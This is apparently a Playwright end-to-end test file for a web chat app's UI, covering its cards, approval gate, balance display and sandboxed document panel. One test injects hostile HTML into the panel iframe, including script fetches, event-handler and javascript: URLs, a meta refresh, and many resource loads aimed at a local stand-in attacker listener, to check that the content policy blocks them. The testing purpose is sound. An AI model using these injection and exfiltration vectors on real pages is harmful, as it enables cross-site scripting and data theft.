// Tester-owned Playwright e2e for plan step 5a exits + docs/design-web-ui.md.
// Drives the BUILT app (vite preview) by typing into the composer — never
// Autoplay, except in the one test that probes Autoplay itself.
// Run: (cd apps/web && VITE_SHOW_MOCK_CONTROLS=1 npx vite build --outDir /tmp/web-e2e && npx vite preview --outDir /tmp/web-e2e --port 4311 --strictPort) &
//      node tests/web/e2e.mjs http://localhost:4311/
// The e2e sets the mock-controls flag itself; it never relies on a committed .env.
import { chromium } from "../../apps/web/node_modules/playwright/index.mjs";
import { readFileSync } from "node:fs";
import { createServer } from "node:http";

// A local listener standing in for an attacker's host: any byte that leaves
// the panel iframe toward it is recorded. Zero hits = nothing left the page.
const hits = [];
const sink = createServer((req, res) => { hits.push(req.method + " " + req.url); res.writeHead(200, { "content-type": "image/png" }); res.end(); });
await new Promise((r) => sink.listen(0, "127.0.0.1", r));
const SINK = `http://127.0.0.1:${sink.address().port}`;

const BASE = process.argv[2] ?? "http://localhost:4311/";
const SHOTS = process.env.SHOTS ?? "/tmp";
const fx = (n) => JSON.parse(readFileSync(new URL(`../../apps/web/fixtures/${n}.json`, import.meta.url), "utf8"));
const results = [];
const rec = (ok, name, detail = "") => { results.push({ ok, name, detail }); console.log(`${ok ? "PASS" : "FAIL"}  ${name}${detail ? "  — " + detail : ""}`); };
const external = [];

const browser = await chromium.launch();

async function newPage(viewport) {
  const ctx = await browser.newContext({ viewport, hasTouch: viewport.width < 500 });
  const page = await ctx.newPage();
  const isExternal = (url) => { const u = new URL(url); return !["localhost", "127.0.0.1"].includes(u.hostname) && !["data:", "about:", "blob:"].includes(u.protocol); };
  page.on("requestfinished", (r) => { if (isExternal(r.url())) external.push(r.url()); });
  await page.addInitScript(() => {
    window.__states = new Set();
    setInterval(() => { const a = document.querySelector(".avatar"); if (a) for (const c of a.classList) if (c.startsWith("avatar--")) window.__states.add(c.slice(8)); }, 5);
  });
  await page.goto(BASE);
  return page;
}
const select = (page, id) => page.locator(".fixture-picker select").selectOption(id);
const avatarState = (page) => page.evaluate(() => [...document.querySelector(".avatar").classList].find((c) => c.startsWith("avatar--")).slice(8));
async function waitSettled(page) {
  await page.waitForFunction(() => { const a = document.querySelector(".avatar"); return a && !a.className.match(/thinking|working/) && !document.querySelector(".composer-input").disabled; }, null, { timeout: 60000 });
  await page.waitForTimeout(150);
}
async function type(page, text) {
  await page.locator(".composer-input").fill(text);
  await page.locator(".composer-input").press("Enter");
  await page.waitForTimeout(50);
  await waitSettled(page);
}
async function playTyped(page, name) {
  for (const m of fx(name).messages) if (m.role === "user") await type(page, m.parts.find((p) => p.type === "text").text);
}
const count = (page, sel) => page.locator(sel).count();

for (const vp of [{ width: 1280, height: 800, tag: "desktop" }, { width: 375, height: 812, tag: "375" }]) {
  const T = (s) => `[${vp.tag}] ${s}`;
  const page = await newPage(vp);
  const phone = vp.width < 500;

  // ---- empty first run
  await select(page, "empty-first-run");
  rec((await avatarState(page)) === "idle", T("empty-first-run avatar idle"));
  const emptyText = await page.locator(".empty-state").innerText();
  rec(/anything of yours yet/.test(emptyText), T("empty-first-run static line"), emptyText.slice(0, 60));
  rec((await page.locator(".balance-chip").innerText()) === "$5.00", T("empty-first-run: a member starts at $5.00 (ui § 1.5)"), await page.locator(".balance-chip").innerText());
  // ui § 1.1: the ⋯ menu has no usage-key item
  await page.locator(".menu-trigger").click();
  const menu = (await page.locator(".menu-panel").innerText()).split("\n").map((x) => x.trim()).filter(Boolean);
  rec(!menu.some((x) => /usage key/i.test(x)), T('menu has no "Manage your usage key"'), JSON.stringify(menu));
  rec(!/usage key/i.test(await page.locator("body").innerText()), T('no "usage key" text anywhere on screen'));
  await page.locator(".menu-trigger").click();

  // ---- mvp journey, typed by hand
  await select(page, "mvp-journey");
  await playTyped(page, "mvp-journey");
  const cards = {};
  for (const c of ["verdict", "plan", "document", "checker", "cost", "gate", "error"]) cards[c] = await count(page, `.card--${c}`);
  rec(cards.verdict === 1 && cards.plan === 1 && cards.document === 1 && cards.checker === 2, T("mvp-journey renders verdict/plan/document/2 checker"), JSON.stringify(cards));
  const planItems = await page.locator(".card--plan .plan-items li span").allInnerTexts();
  const wantItems = fx("mvp-journey").messages.at(-1).parts.find((p) => p.type === "data-card").data.props.items.map((i) => i.text);
  rec(JSON.stringify(planItems) === JSON.stringify(wantItems), T("plan items shown word for word, in file order"));
  const verdictText = await page.locator(".card--verdict").innerText();
  rec(/Dealbreakers: none/.test(verdictText), T("verdict with no dealbreakers reads 'none'"));
  // ran … line, expanded, shows literal input/output
  const toggle = page.locator(".tool-run-toggle").filter({ hasText: "record verdict" }).first();
  const hasRV = await toggle.count();
  const anyToggle = page.locator(".tool-run-toggle").filter({ hasText: "fetch job" }).first();
  await anyToggle.click();
  const detail = await page.locator(".tool-run", { has: anyToggle }).locator(".tool-run-detail").innerText();
  rec(/fetch_job|fetch job/.test(await anyToggle.innerText()) && detail.includes("jd-inbox/acme-staff-pm.md") && detail.includes("\"board\": \"greenhouse\""), T("expanded ran-line shows literal input+output"), (await anyToggle.innerText()).trim());
  await anyToggle.click();
  // no horizontal scroll
  const sw = await page.evaluate(() => [document.documentElement.scrollWidth, window.innerWidth]);
  rec(sw[0] <= sw[1], T("no horizontal scroll after full journey"), `scrollWidth ${sw[0]} vs ${sw[1]}`);
  // tap targets ≥ 44px (ui § 1.2) — phone only
  if (phone) {
    const small = await page.evaluate(() => [...document.querySelectorAll("button, select, textarea, a")].filter((e) => { const r = e.getBoundingClientRect(); const st = getComputedStyle(e); return r.width > 0 && r.height > 0 && st.visibility !== "hidden" && (r.height < 44 || r.width < 44) && r.right > 0 && r.left < window.innerWidth; }).map((e) => `${e.className || e.tagName}:${Math.round(e.getBoundingClientRect().width)}x${Math.round(e.getBoundingClientRect().height)}`));
    rec(small.length === 0, T("tap targets ≥ 44px"), [...new Set(small)].slice(0, 12).join(", "));
  }
  // every Open-in-panel / item open resolves to a file in fixture.files; html sandboxed
  const files = fx("mvp-journey").files;
  const opens = page.locator(".card-open-link");
  const n = await opens.count();
  const opened = [];
  for (let i = 0; i < n; i++) {
    const b = opens.nth(i);
    const label = (await b.innerText()).trim();
    if (label === "Print / Save as PDF") continue;
    await b.scrollIntoViewIfNeeded();
    await b.click();
    await page.waitForTimeout(100);
    const path = (await page.locator(".side-panel-path").innerText()).trim();
    const panelVisible = await page.locator(".side-panel").evaluate((e) => { const r = e.getBoundingClientRect(); return r.width > 0 && r.left < window.innerWidth && r.right > 0; });
    const body = (await page.locator(".side-panel-body").innerText()).trim();
    opened.push({ label, path, ok: path in files && panelVisible && body.length > 0 && body !== "Nothing open yet." });
    if (phone) {
      const full = await page.locator(".side-panel").evaluate((e) => { const r = e.getBoundingClientRect(); return Math.round(r.width) >= window.innerWidth - 1; });
      if (!full) opened.at(-1).ok = false, opened.at(-1).why = "not full-screen sheet";
      await page.locator(".side-panel-back").click();
      await page.waitForTimeout(100);
      const hidden = await page.locator(".side-panel").evaluate((e) => { const r = e.getBoundingClientRect(); return r.left >= window.innerWidth || r.right <= 0 || getComputedStyle(e).display === "none" || getComputedStyle(e).visibility === "hidden"; });
      if (!hidden) opened.at(-1).ok = false, opened.at(-1).why = "back arrow did not close";
    }
  }
  rec(opened.length > 0 && opened.every((o) => o.ok), T(`side panel opens only fixture files (${opened.length} opens)`), JSON.stringify(opened.filter((o) => !o.ok)));
  // Download PDF -> html in sandboxed iframe
  await page.locator(".card-open-link", { hasText: "Print / Save as PDF" }).click();
  await page.waitForTimeout(400);
  const sb = await page.locator(".side-panel-iframe").getAttribute("sandbox");
  const tokens = (sb ?? "").split(/\s+/).filter(Boolean);
  rec(sb !== null && !(tokens.includes("allow-scripts") && tokens.includes("allow-same-origin")), T("html iframe sandboxed, not scripts+same-origin"), `sandbox="${sb}"`);
  // print reachable from the parent (M1): patch the live iframe's print, click again (same path -> same iframe)
  const perr = []; const onErr = (e) => perr.push(e.message); page.on("pageerror", onErr);
  await page.evaluate(() => { const w = document.querySelector(".side-panel-iframe").contentWindow; window.__printCalls = 0; w.print = () => { window.__printCalls++; }; });
  if (phone) await page.locator(".side-panel-back").click();
  await page.locator(".card-open-link", { hasText: "Print / Save as PDF" }).click();
  await page.waitForTimeout(600);
  const calls = await page.evaluate(() => window.__printCalls);
  page.off("pageerror", onErr);
  rec(calls === 1 && perr.length === 0, T("Print / Save as PDF reaches the iframe's print()"), `calls=${calls} errors=${JSON.stringify(perr)}`);
  // N3: the app's own CSP prefix, exactly as § 6.1 pins it, then hostile html behind it
  const CSP = `<meta http-equiv="Content-Security-Policy" content="default-src 'none'; style-src 'unsafe-inline'; img-src data:">`;
  const real = await page.locator(".side-panel-iframe").getAttribute("srcdoc");
  rec(real.startsWith(CSP), T("panel srcdoc starts with the § 6.1 CSP meta, word for word"), real.slice(0, 60));
  const mode = await page.evaluate(() => document.querySelector(".side-panel-iframe").contentDocument.compatMode);
  rec(mode === "CSS1Compat", T("rendered résumé keeps standards mode under the CSP prefix"), `compatMode=${mode}`);
  const hitsBefore = hits.length;
  await page.evaluate(({ CSP, SINK }) => {
    window.__hit = [];
    window.addEventListener("message", (e) => window.__hit.push("postMessage:" + e.data));
    document.querySelector(".side-panel-iframe").srcdoc = CSP + `<!doctype html><html><head>
      <meta http-equiv="Content-Security-Policy" content="default-src *; img-src *">
      <link rel="stylesheet" href="${SINK}/link-css"><link rel="prefetch" href="${SINK}/prefetch"><link rel="preload" as="image" href="${SINK}/preload">
      <style>@import url("${SINK}/import"); body{background:url("${SINK}/css-bg")} @font-face{font-family:x;src:url("${SINK}/font")} p{font-family:x}</style>
      </head><body><p>x</p>
      <script>parent.__hit.push("script");fetch("${SINK}/fetch")<\/script>
      <img src="${SINK}/img"><img src=x onerror="parent.__hit.push('onerror')"><picture><source srcset="${SINK}/srcset"><img></picture>
      <video poster="${SINK}/poster"></video><object data="${SINK}/object"></object><embed src="${SINK}/embed"><iframe src="${SINK}/iframe"></iframe>
      <svg onload="parent.__hit.push('svg')"><image href="${SINK}/svg-image"/></svg>
      <a id=js href="javascript:parent.__hit.push('jsurl')">x</a>
      <a id=top href="${SINK}/top" target="_top">t</a><a id=blank href="${SINK}/blank" target="_blank">b</a><a id=ping href="#" ping="${SINK}/ping">p</a>
      <form id=fm action="${SINK}/form" target="_top"><input name=q value=1></form>
      <meta http-equiv="refresh" content="0;url=${SINK}/refresh"></body></html>`;
  }, { CSP, SINK });
  await page.waitForTimeout(1200);
  const fr = page.frameLocator(".side-panel-iframe");
  for (const id of ["#js", "#top", "#blank", "#ping"]) await fr.locator(id).click({ timeout: 1500 }).catch(() => {});
  await page.evaluate(() => { try { document.querySelector(".side-panel-iframe").contentDocument.getElementById("fm")?.submit(); } catch {} });
  await page.waitForTimeout(2000);
  const hostile = await page.evaluate(() => ({ hit: window.__hit, url: location.href }));
  const pages = page.context().pages().length;
  rec(hostile.hit.length === 0 && hostile.url === BASE && pages === 1, T("hostile html in the panel iframe cannot reach the parent"), `hits=${JSON.stringify(hostile.hit)} url=${hostile.url} pages=${pages}`);
  const auto = hits.slice(hitsBefore);
  rec(auto.length === 0, T("hostile html: zero bytes reach a 127.0.0.1 listener"), auto.join(", "));
  await page.screenshot({ path: `${SHOTS}/tester-${vp.tag}-mvp.png`, fullPage: true });
  if (phone) await page.locator(".side-panel-back").click().catch(() => {});

  // ---- checker failure
  await select(page, "checker-failure");
  await playTyped(page, "checker-failure");
  const failCard = await page.locator(".card--checker").first().innerText();
  rec(!/undefined/.test(failCard) && failCard.includes("Experience bullet not verbatim"), T("checker FAIL card shows the finding word for word"), JSON.stringify(failCard.split("\n").slice(1, 3)));
  rec((await count(page, ".card--document")) === 1, T("checker-failure: document card after the fix"));

  // ---- over-limit error
  await select(page, "over-limit-error");
  await playTyped(page, "over-limit-error");
  const err = await page.locator(".card--error").innerText();
  rec(err.includes("over_balance") && err.includes("Your beta credit is used up. Ask the person who invited you for more.") && !/add funds/i.test(err), T("error card renders code + the proxy's message verbatim, no next-step line"), err.replace(/\n/g, " | "));
  // ui § 2.5: a pre-call refusal -> no model reply after it (the error card is the last thing in the turn, and no later turn)
  const lastChildIsError = await page.locator(".bubble--assistant").last().evaluate((b) => b.lastElementChild?.classList.contains("card--error"));
  const bubblesAfter = await page.evaluate(() => { const e = document.querySelector(".card--error"); const all = [...document.querySelectorAll(".bubble")]; return all.length - 1 - all.indexOf(e.closest(".bubble")); });
  rec(lastChildIsError && bubblesAfter === 0, T("nothing from the model after the over_balance refusal"), `lastChildIsError=${lastChildIsError} bubblesAfter=${bubblesAfter}`);
  rec((await page.locator(".balance-chip").innerText()) === "$0.00", T("chip reads $0.00 once over_balance is on screen"), await page.locator(".balance-chip").innerText());
  await page.evaluate(() => window.dispatchEvent(new Event("focus")));
  await page.waitForTimeout(200);
  rec((await page.locator(".balance-chip").innerText()) === "$0.00", T("chip still $0.00 after a window-focus re-read"));
  rec((await count(page, ".card--cost")) === 1, T("cost card renders"), await page.locator(".card--cost").innerText());
  rec((await avatarState(page)) === "done", T("after error turn avatar = done"));

  // ---- L1: chip before any balance-bearing part (gate-moment has files:{} but is NOT a new account)
  await select(page, "gate-moment");
  rec((await page.locator(".balance-chip").innerText()) === "—", T("gate-moment chip before any cost card is unknown, not a number"), await page.locator(".balance-chip").innerText());
  await select(page, "checker-failure");
  const cfEmpty = await page.locator(".empty-state").count() ? await page.locator(".empty-state").innerText() : "";
  rec(!/anything of yours yet/.test(cfEmpty), T("checker-failure (workspace has files) does not claim 'nothing of yours yet'"), cfEmpty.slice(0, 50));

  // ---- gate: scripted path, typed
  await select(page, "gate-moment");
  await type(page, "can you evaluate the 6 roles I saved this week?");
  rec((await avatarState(page)) === "needs-you", T("open gate -> avatar needs-you"));
  const title = await page.locator(".avatar").getAttribute("title");
  rec(title?.includes("evaluate 6 saved roles"), T("needs-you hover = gate label"), title);
  rec((await page.locator(".card--gate button, .card--gate [role=button], .card--gate input").count()) === 0, T("gate card has no button/input"));
  // click every enabled non-dev button on the page; gate must stay pending
  const handles = await page.locator("button:enabled").elementHandles();
  const clicked = [];
  for (const b of handles) {
    const txt = ((await b.innerText()) || (await b.getAttribute("aria-label")) || "").trim();
    if (/Autoplay/.test(txt)) continue;
    if (!(await b.isVisible())) continue;
    await b.click({ timeout: 2000 }).catch(() => {}); clicked.push(txt); await page.waitForTimeout(80);
    if (await page.locator(".side-panel-back").isVisible() && phone) await page.locator(".side-panel-back").click().catch(() => {});
  }
  await page.waitForTimeout(300);
  rec((await page.locator(".card--gate .badge").innerText()) === "pending", T("clicking every enabled button leaves the gate pending"), clicked.join(","));
  await type(page, "hmm, let me think");
  const lastBubble = await page.locator(".bubble--assistant").last().innerText();
  rec(lastBubble.includes("Not approved — type yes to go ahead."), T("off-script reply -> fixed not-approved line"));
  await type(page, "wait, what if I only did 5 of them instead of 6?");
  const m4Bubble = await page.locator(".bubble--assistant").last().innerText();
  rec(m4Bubble.includes("That wasn't a yes") && (await count(page, ".card--cost")) === 2, T("scripted reply at the gate replays its scripted turn (m4)"), m4Bubble.split("\n").slice(1, 2).join(" ").slice(0, 80));
  rec((await avatarState(page)) === "needs-you", T("still needs-you after non-yes"));
  await type(page, "yes");
  rec((await page.locator(".card--gate .badge").innerText()) === "approved", T("typed yes approves"));
  rec((await avatarState(page)) === "done", T("approved -> done"));
  const states = await page.evaluate(() => [...window.__states]);
  rec(["idle", "thinking", "working", "needs-you", "done"].every((s) => states.includes(s)), T("all five avatar states observed"), states.join(","));

  // ---- gate: typed yes straight away
  await select(page, "mvp-journey"); await select(page, "gate-moment");
  await type(page, "can you evaluate the 6 roles I saved this week?");
  await type(page, "yes");
  const b2 = await page.locator(".bubble--assistant").last().innerText();
  rec((await page.locator(".card--gate .badge").innerText()) === "approved", T("typed yes directly at the gate approves"), `badge=${await page.locator(".card--gate .badge").innerText()}; reply="${b2.split("\n").slice(1).join(" ").slice(0, 90)}"`);

  // ---- gate: exact no declines; a later yes must not re-open/approve it
  await select(page, "mvp-journey"); await select(page, "gate-moment");
  await type(page, "can you evaluate the 6 roles I saved this week?");
  await type(page, "no");
  const afterNo = await page.locator(".card--gate .badge").innerText();
  await type(page, "yes");
  const afterNoYes = await page.locator(".card--gate .badge").innerText();
  rec(afterNo === "declined" && afterNoYes === "declined", T("no declines; later yes leaves it declined"), `after no=${afterNo}, after later yes=${afterNoYes}`);

  // ---- gate: Autoplay (a button) must not be able to approve
  await select(page, "mvp-journey"); await select(page, "gate-moment");
  await page.getByRole("button", { name: "Autoplay" }).click();
  await page.waitForFunction(() => { const b = document.querySelector(".card--gate .badge"); return b && b.textContent !== "pending"; }, null, { timeout: 30000 }).catch(() => {});
  await page.waitForTimeout(4000);
  const gb = await page.locator(".card--gate .badge").innerText().catch(() => "no gate");
  rec(gb !== "approved", T("Autoplay button cannot approve the gate"), `gate badge after Autoplay: ${gb}`);
  await page.context().close();
}

rec(external.length === 0, "zero external requests (all viewports, all fixtures)", external.slice(0, 5).join(" "));
await browser.close();
sink.close();
const fails = results.filter((r) => !r.ok).length;
console.log(`\n${results.length - fails} passed, ${fails} failed`);
process.exit(fails ? 1 : 0);
